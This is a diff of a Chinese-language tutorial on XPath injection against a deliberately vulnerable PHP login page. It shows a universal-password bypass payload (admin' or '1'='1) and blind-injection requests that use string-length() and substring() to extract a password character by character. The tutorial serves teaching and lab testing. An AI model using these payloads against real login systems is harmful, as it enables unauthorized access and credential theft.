@@ -17,7 +17,7 @@ xpath_user.xml 文件
 </users>
 ```
 
-漏洞测试文件
+漏洞测试文件xpath.php
 
 ```php+HTML
 <!DOCTYPE html>
@@ -53,26 +53,24 @@ if(file_exists('xpath_user.xml')){
 ?>
 ```
 
-```php+HTML
+```bash
 $sql="//user[@username='{$username}' and @password='{$password}']";
 select * from users where username=’username’ and password=’password’
 ```
 
 **4、注入方法**
 
-万能密码登录 
+万能密码登录 **admin' or '1'='1**
 
 ```bash
-admin' or '1'='1
 username=admin' or '1'='1 &password=xxxxxxxxxxx&submit=submit
 ```
 
-![img](../acess/wps3.jpg) 
+![image-20210426002213544](../acess/image-20210426002213544.png) 
 
 **5、盲注入**
 
 string-length()获取字符长度
-
 substring 截取字符
 
 ```bash
@@ -81,10 +79,14 @@ username=admin'and string-length(@password)=5 or '1'='1&password=0&submit=submit
 
 返回正确是就等于登录成功
 
+先获取第一个字符
+
 ```bash
 username=admin'and substring(@password,1,1)='a' or '1'='1&password=0&submit=submit
 ```
 
-![img](../acess/wps4.jpg) 
+![image-20210426002700785](../acess/image-20210426002700785.png) 
 
-先获取第一个字符 再获取第二个。admin
+ 再获取第二个![image-20210426002752235](../acess/image-20210426002752235.png)
+
+依次类推，获得密码admin
